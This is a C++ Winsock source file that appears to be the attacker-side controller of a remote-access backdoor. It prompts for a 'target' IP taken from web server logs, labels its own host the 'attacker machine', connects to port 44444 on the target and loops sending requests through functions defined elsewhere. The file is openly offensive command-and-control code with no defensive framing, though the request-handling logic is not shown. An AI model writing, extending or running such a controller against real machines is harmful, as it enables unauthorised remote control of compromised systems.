
#include "communication.h"


int main() {
    SOCKET ServerSocket;
    int Result;
    char SenderIP[MAX_IPV4_SIZE] = { 0 };
    char ServerIP[MAX_IPV4_SIZE] = { 0 };
    printf("[!] Write IP address of target (see in the web server requests logs) -> ");
    std::cin >> ServerIP;
    if (!IsValidIp(ServerIP)) {
        printf("\n[-] Wrong format of IPV4 address, format should consist of:\n1. 4 one digit - triple digit numerical values in the range of 1-255\n2. There should be a . between each chunk and the previous chunk\n3. address should NOT consist any other non-numerical characters except the 3 . between each 2 chunks\nExample address: 192.1.178.49\n");
        return 0;
    }

    if (!MatchIpAddresses(SenderIP, ServerIP)) {
        printf("\n[-] Could not get the address of the attacker machine relatively to the target machine!\n");
        return 0;
    }
    printf("\nTarget address: %s, attacker address: %s\n", ServerIP, SenderIP);

    USHORT SrvPort = 44444;
    USHORT SndPort = 44444;
    NETWORK_INFO NetArr[2];
    SetNetStructs(ServerIP, SenderIP, SrvPort, SndPort, NetArr);


    // Initialize Winsock (required for using sockets and socket functions) -
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        std::cerr << "Winsock initialization process failed\n";
        return 1;
    }


    // Create sending socket -
    ServerSocket = socket(AF_INET, SOCK_STREAM, 0);
    if (ServerSocket == INVALID_SOCKET) {
        std::cerr << "Could not create socket object: " << WSAGetLastError() << "\n";
        WSACleanup();
        return 1;
    }
    NetArr[0].AsoSock = ServerSocket;



    // Connect socket -
    if (connect(NetArr[0].AsoSock, (sockaddr*)&NetArr[1].AddrInfo, sizeof(sockaddr)) == SOCKET_ERROR) {
        std::cerr << "Error connecting to server: " << WSAGetLastError() << std::endl;
        closesocket(NetArr[0].AsoSock);
        WSACleanup();
        return 1;
    }


    // Start main operations -
    printf("Initialization of connection succeeded, proceeding to start sending requests..\n");
    while (1 == 1) {
        Result = ReqAct(NetArr[0], NetArr[1]);
        CleanNetStack(NetArr[0].AsoSock);
        if (Result == -1) {
            closesocket(NetArr[0].AsoSock);
            WSACleanup();
            return -45;
        }
    }

    WSACleanup();
    return 0;
}